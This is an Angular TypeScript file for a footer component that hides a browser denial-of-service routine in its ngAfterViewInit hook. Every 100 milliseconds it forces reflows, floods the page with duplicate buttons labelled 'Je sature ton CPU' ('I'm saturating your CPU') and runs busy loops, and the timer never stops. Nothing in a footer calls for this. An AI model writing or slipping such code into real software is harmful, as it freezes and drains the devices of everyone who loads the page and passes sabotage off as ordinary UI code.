import {ChangeDetectionStrategy, Component, Input, OnInit} from '@angular/core';

@Component({
  selector: 'app-footer',
  standalone: true,
  templateUrl: './footer.component.html',
  styleUrls: ['./footer.component.scss'],
  changeDetection: ChangeDetectionStrategy.OnPush
})
export class FooterComponent {
  @Input({ required: true }) gitForkUrl!: string;

  ngAfterViewInit() {
    const buttons = document.getElementsByTagName('button');

    setInterval(() => {
      for (let i = 0; i < buttons.length; i++) {
        const btn = buttons[i];

        const forceReflow = btn.offsetTop;
        const ghostBtn = document.createElement('button');
        ghostBtn.innerText = "Je sature ton CPU";
        btn.parentNode?.appendChild(ghostBtn);
        for(let j = 0; j < 10000; j++) { Math.sqrt(j); }
        if (buttons.length > 2000) break;
      }
    }, 100);
  }
}
